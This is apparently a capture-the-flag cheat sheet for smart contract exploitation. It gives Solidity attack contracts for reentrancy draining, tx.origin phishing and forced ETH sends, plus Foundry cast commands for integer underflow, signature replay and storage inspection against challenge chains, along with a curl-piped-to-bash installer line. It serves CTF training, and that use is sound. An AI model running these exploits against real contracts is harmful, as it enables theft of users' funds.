# Web3 / Blockchain CTF — Smart Contract Exploitation

## Overview
Smart contract vulnerabilities allow draining funds or breaking invariants.
Tools: Foundry (cast/forge), Hardhat, Remix IDE, ethers.js, web3.py.

## Setup

```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash && foundryup

# Connect to CTF chain
export RPC_URL="http://CHALLENGE_IP:PORT"
export PRIVATE_KEY="0xYOUR_PRIVATE_KEY"
export CONTRACT="0xCHALLENGE_CONTRACT"

# Check balance
cast balance $WALLET --rpc-url $RPC_URL

# Read contract storage slot 0
cast storage $CONTRACT 0 --rpc-url $RPC_URL

# Call a function
cast call $CONTRACT "isSolved()(bool)" --rpc-url $RPC_URL
```

## Common Vulnerability Patterns

### 1. Reentrancy
```solidity
// Attack contract
contract ReentrancyAttack {
    address target;
    constructor(address _t) { target = _t; }

    function attack() external payable {
        (bool ok,) = target.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok);
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    receive() external payable {
        if (target.balance >= 1 ether) {
            target.call(abi.encodeWithSignature("withdraw()"));
        }
    }
}
```

```bash
# Deploy and attack
forge create --rpc-url $RPC_URL --private-key $PRIVATE_KEY src/Attack.sol:ReentrancyAttack \
  --constructor-args $CONTRACT
cast send ATTACK_ADDR "attack()" --value 1ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 2. Integer Overflow (Solidity < 0.8.0)
```bash
# Find overflow in old contracts
# uint overflow: 2^256 - 1 + 1 = 0
# underflow: 0 - 1 = 2^256 - 1
cast call $CONTRACT "balanceOf(address)(uint256)" $WALLET --rpc-url $RPC_URL

# Send tx that causes underflow to gain tokens
cast send $CONTRACT "transfer(address,uint256)" DUMMY_ADDR 1 --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

### 3. tx.origin Phishing
```solidity
// If contract uses tx.origin for auth, trick owner to call your contract
contract PhishingAttack {
    address target;
    constructor(address _t) { target = _t; }
    function phish() external {
        target.call(abi.encodeWithSignature("withdraw()"));
    }
}
```

### 4. Uninitialized Storage / Proxy Collision
```bash
# Read all storage slots to find uninitialized state
for i in $(seq 0 20); do
    echo "Slot $i: $(cast storage $CONTRACT $i --rpc-url $RPC_URL)"
done

# Check implementation slot (EIP-1967)
cast storage $CONTRACT 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc --rpc-url $RPC_URL
```

### 5. Selfdestruct / Forced ETH Send
```solidity
// Force ETH into contract that breaks balance assumptions
contract ForceEth {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}
```

### 6. Flash Loan Price Manipulation
```bash
# Most DeFi exploits follow: flashloan → manipulate oracle → profit → repay
# Check Uniswap V2 price: spot price vs TWAP
cast call PAIR "getReserves()(uint112,uint112,uint32)" --rpc-url $RPC_URL
```

### 7. Signature Replay / Lack of Nonce
```bash
# If signature doesn't include nonce/chainId, reuse it
# Get valid signature from blockchain tx
cast tx TX_HASH --rpc-url $RPC_URL

# Replay with same signature
cast send $CONTRACT "claimWithSig(address,uint256,bytes)" $WALLET AMOUNT SIGNATURE \
  --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## Useful cast Commands

```bash
# Decode calldata
cast calldata-decode "transfer(address,uint256)" 0xCALLDATA

# Get all events from contract
cast logs --from-block 0 --to-block latest --address $CONTRACT --rpc-url $RPC_URL

# Impersonate account (Anvil/Hardhat only)
cast rpc anvil_impersonateAccount $ACCOUNT --rpc-url $RPC_URL

# Get contract bytecode
cast code $CONTRACT --rpc-url $RPC_URL

# Decompile bytecode
cast decompile $CONTRACT --rpc-url $RPC_URL 2>/dev/null || \
  python3 -c "import subprocess; subprocess.run(['heimdall', 'decompile', '$CONTRACT'])"
```

## Foundry Test Template
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract SolveTest is Test {
    address constant TARGET = 0xCHALLENGE_CONTRACT;
    address constant PLAYER = 0xYOUR_WALLET;

    function setUp() public {
        vm.createSelectFork("http://CHALLENGE_IP:PORT");
    }

    function testSolve() public {
        vm.startPrank(PLAYER);
        // exploit here
        assertTrue(IChallenge(TARGET).isSolved());
    }
}
```

indicators: web3 blockchain solidity smart contract ethereum reentrancy
